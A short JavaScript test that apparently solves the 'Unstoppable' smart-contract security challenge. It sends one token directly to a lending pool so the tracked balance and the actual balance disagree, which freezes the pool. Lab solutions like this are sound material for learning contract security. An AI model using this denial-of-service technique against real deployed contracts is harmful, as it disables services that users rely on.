/**
 * Exploit for the Unstoppable vulnerability
 * 
 * This exploitation creates an inconsistency between the tracked balance and the actual balance
 * by sending tokens directly to the contract, thereby paralyzing the service.
 */

it('Exploit', async function () {
    // Send 1 token directly to the contract without going through depositTokens()
    // This creates a gap between poolBalance and the contract's actual balance
    console.log('Internal balance (poolBalance) before:', (await this.pool.poolBalance()).toString());
    console.log('Actual balance before:', (await this.token.balanceOf(this.pool.address)).toString());
    
    // The attack: direct transfer that modifies the actual balance without modifying poolBalance
    await this.token.transfer(this.pool.address, 1, { from: attacker });
    
    console.log('Internal balance (poolBalance) after:', (await this.pool.poolBalance()).toString());
    console.log('Actual balance after:', (await this.token.balanceOf(this.pool.address)).toString());
    console.log('The system is now paralyzed');
  });